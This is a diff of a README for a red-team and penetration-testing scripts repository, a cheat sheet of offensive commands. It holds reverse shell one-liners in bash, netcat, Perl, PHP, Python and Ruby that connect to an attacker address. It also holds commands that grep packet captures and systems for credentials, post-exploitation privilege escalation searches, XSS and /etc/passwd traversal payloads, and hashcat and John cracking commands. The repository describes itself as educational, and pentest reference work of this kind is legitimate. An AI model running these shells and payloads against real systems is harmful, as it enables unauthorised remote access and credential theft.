@@ -2,7 +2,7 @@
 
 A collection of random custom scripts for penetration testing and red team tasks.
 
-📌 Includes: Automation scripts, Reconnaissance tools, Scanning utilities, Exploitation scripts, Post-exploitation helpers, Report generation tools, Notes & cheat sheets etc.
+Includes: Automation scripts, Reconnaissance tools, Scanning utilities, Exploitation scripts, Post-exploitation helpers, Report generation tools, Notes & cheat sheets etc.
 
 
 
@@ -16,7 +16,7 @@ A collection of random custom scripts for penetration testing and red team tasks
 * [Web Attacks](#-web-attacks)
 * [Password Attacks](#-password-attacks)
 * [Tools Reference](#-tools-reference)
-* [General Notes](#-general-notes)
+* [Explore More](#-explore-more)
 
 
 
@@ -40,7 +40,9 @@ red-team-tools/
 
 </details>
 
----
+
+
+&nbsp;
 
 ## 🌟 Tips & tricks
 
@@ -198,11 +200,14 @@ Value: $E[1;30;104m►$E[1;37;104m $P $E[1;94;40m►$E[0m
 
 
 
----
+&nbsp;
+
+
 
 ## 🔍 Recon & Enumeration
 
 Reconnaissance (recon) in red teaming is the foundational phase where ethical hackers gather intelligence about a target organization to identify vulnerabilities and plan realistic attack simulations.
+
 
 ```bash
 # DNS Lookup
@@ -213,7 +218,7 @@ host domain.com
 ffuf -w subs.txt -u https://FUZZ.target.com
 ```
 
-**Social engineering tehniques**
+### Social engineering tehniques
 
 \- Impersonation /identity theft - the attacker creates a fake online profile to impersonate an employee and trick colleagues into disclosing confidential information.  
 
@@ -240,10 +245,38 @@ ffuf -w subs.txt -u https://FUZZ.target.com
 \- Typosquatting/ URL hijacking - slight misspelling of a legitimate website. 
 
 
+### Packet capture (Pcap) analysis
 
----
+Extract printable strings from the pcap and grep for likely secrets
+
+```bash
+strings capture.pcap \
+  | egrep -i 'password|passwd|username|user|authorization|bearer|token|session|cookie|api[_-]?key|secret|key|auth' \
+  | sed -n '1,200p'
+```
+
+Follow TCP streams and search each stream for cleartext creds
+
+```bash
+# list stream ids for TCP
+tshark -r capture.pcap -q -z conv,tcp | sed -n '4,$p' \
+  | awk '{print $1":"$2":"$3}' | sed '/^$/d' \
+
+# Then for a specific stream (e.g. 10):
+tshark -r capture.pcap -q -z "follow,tcp,ascii,10" >/tmp/stream10.txt
+grep -Ei 'password|pass|user|login|authorization|bearer|token|cookie|api_key|secret' /tmp/stream10.txt -n
+```
+
+
+
+&nbsp;
+
+
 
 ## Scanning
+
+The goal of scanning is to discover how the target system responds to various intrusion attempts
+
 
 ### Stealth Techniques
 
@@ -270,7 +303,8 @@ nmap -p- -T4 -A -v target.com
 sudo nmap 10.0.0.1/24 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2
 ```
 
------
+
+&nbsp;
 
 
 ## 💥 Exploitation
@@ -284,38 +318,65 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 **Netcat reverse shell**
-```Netcat Reverse Shell One-Liners
+
+```bash
 nc -e /bin/sh IP PORT
 ```
 
 Netcat without -e Reverse Shell One-Liners
-```
+
+```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
 ```
 
 Perl Reverse Shell One-Liners
-```
+
+```bash
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 PHP Reverse Shell One-Liners
-```
+
+```bash
 php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 Python Reverse Shell One-Liners
-```
+
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 Ruby Reverse Shell One-Liners
-```
+
+```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
----
+
+
+&nbsp;
+
+
 
 ## 🩻 Post-Exploitation
+
+This is where the attacker uses the established access to achieve their goals/intentions.
+
+\- Internal recon 
+
+\- Data Exfiltration  
+
+\- Privilege Escalation  
+
+\- Lateral Movement  
+
+\- Command and Control (C2)  
+
+\- Malware installation  
+
+\- Vulnerability exploitation   
+
 
 ```bash
 # Grab users & creds
@@ -332,6 +393,7 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 
 \- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
+
 \- [GTOBins - Linux](https://gtfobins.github.io/) 
 
 
@@ -350,9 +412,13 @@ sudo -l
 find / -writable -type f 2>/dev/null
 ```
 
----
+&nbsp;
 
 ## 💬 Web Attacks
+
+Web attacks exploit vulnerabilities in applications to steal data, disrupt services, or gain unauthorized access
+
+\- [OWASP](https://owasp.org/)
 
 ```bash
 # XSS payload
@@ -365,9 +431,25 @@ find / -writable -type f 2>/dev/null
 ../../../../etc/passwd
 ```
 
----
+&nbsp;
 
 ## 🔐 Password Attacks
+
+Password cracking is heavily limited by hardware capabilities. The speed and feasibility of cracking depend on the computational power of the hardware used
+
+**Recommendations**
+
+\- High-end GPU's like RTX 4090
+
+\- Rent powerful cloud GPU instances (e.g., AWS, Google Cloud)
+
+\- Custom hardware like FPGAs or ASICs
+
+\- Quantum computing algorithms (Year 2025:Limitations in qubit stability and error correction)
+
+
+
+
 
 ```bash
 # Hashcat basic usage
@@ -380,9 +462,20 @@ john --wordlist=rockyou.txt hashes.txt
 fcrackzip -v -u -D -p rockyou.txt file.zip
 ```
 
----
+⚠️Strong password hashing algorithms (e.g., scrypt, Argon2) are designed to be memory-hard, reducing the advantage of GPUs and custom hardware by requiring large amounts of memory, thus leveling the playing field
+
+
+&nbsp;
 
 ## 🧰 Tools Reference
+
+To master essential cybersecurity tools like Metasploit and Burp Suite, focus on understanding their core functions and practice in legal environments.
+
+\- [Metasploit framework](https://github.com/rapid7/metasploit-framework)
+
+\- [Burpsuite framework](https://portswigger.net/burp)
+
+
 
 ```bash
 # Gobuster
@@ -398,21 +491,11 @@ nikto -h http://target.com
 
 
 
-## 📝 General Notes
+## 📝 Explore More
 
-Check for .bak, .old, .zip files on webservers
+This section includes links to references, services, tools, and assets for those wishing further exploration.
 
-Default creds go a long way
-
-Look for dev/test/staging endpoints
-
-Don’t sleep on SSRF, IDOR, or misconfigured cloud buckets
-
-Always verify shell stability (TTY, backgrounding)
-
-
-
-**Additional resources**
+Special thanks to individuals whom I incorporated their work into this repo. 
 
 \- [Roadmaps](https://roadmap.sh/)
 
@@ -427,7 +510,7 @@ Always verify shell stability (TTY, backgrounding)
 \- [Red team tools by A-poc](https://github.com/A-poc/RedTeam-Tools)
 
 
----
+&nbsp;
 
 
 ## 🧾 License
@@ -435,11 +518,16 @@ Always verify shell stability (TTY, backgrounding)
 Free to use, share, and modify under the MIT License.
 
 
----
+&nbsp;
 
 ## ⚠️ Disclaimer
 
-This repository is strictly for **educational and research** purposes.
-I take **no responsibility** for misuse, illegal activity, or any damage caused by these tools.
-**Use responsibly. Don't be dumb.**
+>This repository is strictly for **educational and research** purposes.
+>
+>I take **no responsibility** for misuse, illegal activity, or any damage caused by these tools.
+>
+>**Use responsibly. Don't be dumb.**
 
+&nbsp;
+
+"⚔️Never stop breaking things - for the right reasons."
